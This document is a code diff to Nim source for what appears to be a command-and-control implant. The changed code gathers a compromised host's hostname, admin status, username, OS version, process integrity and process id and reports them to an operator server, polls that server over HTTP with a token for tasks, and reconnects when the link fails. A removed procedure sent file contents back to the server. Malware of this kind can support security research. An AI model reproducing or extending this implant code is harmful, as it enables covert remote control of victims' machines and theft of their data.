@@ -43,7 +43,7 @@ proc sendData(app: App, data: string) =
       return
 
 type DataType* = enum
-  File, Text, Code, Image, Object
+  File = "file", Text = "text", Code = "code", Image = "image", Object = "object"
 
 type 
   TaskOutput* = ref object
@@ -56,18 +56,7 @@ proc addData*(output: TaskOutput, dataType: DataType, name: string, contents: st
   let enContents = newJString(encode(contents))
   if output.data.isNil():
     output.data = %*{}
-  case dataType:
-  of File:
-    output.data[name & "::file"] = enContents
-  of Text:
-    output.data[name & "::text"] = enContents
-  of Code:
-    output.data[name & "::code"] = enContents
-  of Image:
-    output.data[name & "::image"] = enContents
-  of Object:
-    output.data[name & "::object"] = enContents
-
+  output.data[name & "::" & $dataType] = enContents
 
 proc sendOutput*(app: App, taskOutput: TaskOutput) =
   let j = %*
@@ -82,12 +71,14 @@ proc sendOutput*(app: App, taskOutput: TaskOutput) =
 proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
               windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
               linuxVersionInfo: tuple[kernelVersion: string], ownIntegrity: string, pid: int, pname: string) =
-  let j = %*
-    {
-      "task": "identify",
-      "taskId": taskId,
-      "error": "",
-      "data": {
+  let taskOutput = TaskOutput(
+    task: "identify",
+    taskId: taskId,
+    error: "",
+    data: %*{}
+  )
+
+  let j = %*{
         "hostname": hostname,
         "isAdmin": isAdmin,
         "username": username,
@@ -104,8 +95,9 @@ proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username:
           "kernelVersion": linuxVersionInfo.kernelVersion
         }
       }
-    }
-  app.sendData($j)
+  
+  taskOutput.data = j
+  app.sendOutput(taskOutput)
 
 proc unknownTask*(app: App, taskId: int, taskName: string) =
   let j = %*
@@ -114,19 +106,6 @@ proc unknownTask*(app: App, taskId: int, taskName: string) =
       "taskId": taskId,
       "error": "unknown task",
       "data": {}
-    }
-  app.sendData($j)
-
-proc sendFile*(app: App, taskId: int, path: string, b64c: string, error: string = "") =
-  let j = %*
-    {
-      "task": "file",
-      "taskId": taskId,
-      "error": error,
-      "data": {
-        "path": path,
-        "contents": b64c
-      }
     }
   app.sendData($j)
 
@@ -149,18 +128,21 @@ proc fetchTasks*(app: App): JsonNode =
       app.socket.close()
     let decoded = decode(line)
     result = parseJson(decoded)
+  
   elif defined(http):
     var httpResponse: string
-    var fail = false
     try:
+      # fetch the tasks using our token
       httpResponse = app.httpClient.getContent(app.httpRoot & "/t?id=" & app.token)
     except OSError:
-      when defined(debug):
-        echo getCurrentExceptionMsg()
+      # server is down, rebuild the http client
+      # because otherwise the old connection
+      # would be used (known bug)
       app.httpClient = newHttpClient()
-      fail = true
+      return %*[]
     except HttpRequestError:
+      # server is back up, but our token is invalid
+      # so we should refresh it
       app.connectToC2()
-      fail = true
-    if fail: return %*[]
+      return %*[]
     result = parseJson(decode(httpResponse))
